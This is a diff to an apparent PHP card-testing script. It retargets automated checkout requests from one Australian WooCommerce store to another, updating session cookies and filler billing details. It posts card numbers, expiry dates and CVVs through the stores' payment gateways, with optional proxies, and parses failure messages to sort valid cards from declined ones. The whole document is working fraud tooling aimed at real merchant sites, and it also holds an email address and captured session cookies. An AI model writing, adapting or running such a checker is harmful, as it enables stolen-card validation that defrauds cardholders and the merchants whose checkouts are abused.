@@ -205,7 +205,7 @@ curl_close($ch);
 // // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://mgaonline.com.au/checkout/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://telkee.com.au/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -238,16 +238,15 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'Cookie: PHPSESSID=vokdi8jjh864h0170iqmagu5b4; woocommerce_items_in_cart=1; woocommerce_cart_hash=f85fba87120d08673980326b98df1ca9; wp_woocommerce_session_4a63af4a0334e6a2e6aabdbcd2bf2648=fe9d5944e398d7895f3cf6a23918a767%7C%7C1594355868%7C%7C1594352268%7C%7C20715e22979a3ff3c400ffbae648c3f0; wordpress_logged_in_4a63af4a0334e6a2e6aabdbcd2bf2648=pubgkittu%7C1595392720%7CI8pGWxfJUaHLz4jW0QEHidGiFmcaDMuZr6ycu3dq1eG%7C7b3228e56f5acb1cbb4ff47d8e354bb239d66ee6ae6928226631ba01e921e403; wfwaf-authcookie-a91661de683a206a94e0a45e0a7bcb6e=8684%7C%7Ce8ff88205f57ec4992e2dc62e8c33afdc987c72d7a67947423eb08d958daccbf',
-'Host: mgaonline.com.au',
-'Origin: https://mgaonline.com.au',
-'Referer: https://mgaonline.com.au/checkout/',
+'cookie: wp_woocommerce_session_4b45f9b4c753d4ccbd419dae4a3fc34b=a1755acb33364e87b11ff772571a1f22%7C%7C1594528298%7C%7C1594524698%7C%7Cd204701bde659223ba8cde4b3013fa63; woocommerce_items_in_cart=1; woocommerce_cart_hash=44359c586d92be4ad3cdf73a5b525e76; woocommerce_recently_viewed=7472%7C7799%7C7504; __cfduid=dc718970894158646515841580545f72e1594470680; TawkConnectionTime=0',
+'origin: https://telkee.com.au',
+'referer: https://telkee.com.au/checkout/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_email=pubgkittu%40gmail.com&billing_phone=%2B615182641524&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&coupon_code=&payment_method=eway_payments&eway_payments-card-name=Vincent+Warner&eway_payments-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&eway_payments-card-expiry='.$mes.'+%2F+'.$ano.'&eway_payments-card-cvc='.$cvv.'&_wpnonce=57f0adb712&_wp_http_referer=%2Fcheckout%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_country=AU&billing_address_1=12+Avenue+Road&billing_address_2=&billing_city=GLEBE&billing_state=NSW&billing_postcode=2037&billing_phone=424154114&billing_email=pubgkit.tu%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=NSW&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flat_rate%3A5&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=955aec29c6&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -257,7 +256,7 @@ if (curl_errno($ch)) {
     echo 'Error:'.curl_error($ch);
 }
 curl_close($ch);
-$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\">\n\t\t\t<li>Transaction failed<br \/>','<\/li>\n\t<\/ul>\n"')));
+$message = trim(strip_tags(getstr($result,'{"result":"failure","messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
 // $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
 // // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
